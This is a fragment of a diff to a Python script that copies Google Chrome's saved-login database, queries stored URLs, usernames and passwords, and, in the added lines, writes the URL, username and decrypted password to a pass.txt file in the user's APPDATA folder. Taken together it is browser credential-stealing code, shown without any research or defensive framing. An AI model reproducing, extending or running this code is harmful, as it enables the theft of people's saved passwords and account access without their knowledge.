@@ -44,6 +44,7 @@ login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\Us
 shutil.copy2(login_db, "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
 conn = sqlite3.connect("Loginvault.db")
 cursor = conn.cursor()
+
 try:
     cursor.execute("SELECT action_url, username_value, password_value FROM logins")
     for r in cursor.fetchall():
@@ -58,7 +59,13 @@ except Exception as e:
     pass
 cursor.close()
 conn.close()
+
+file = open(os.getenv("APPDATA") + '\\pass.txt', "w+")  # данные
+file.write(str(url) + '\n' + str(username) + '\n' + str(decrypted_password) + '\n')
+file.close()
+
 try:
     os.remove("Loginvault.db")
+
 except Exception as e:
     pass
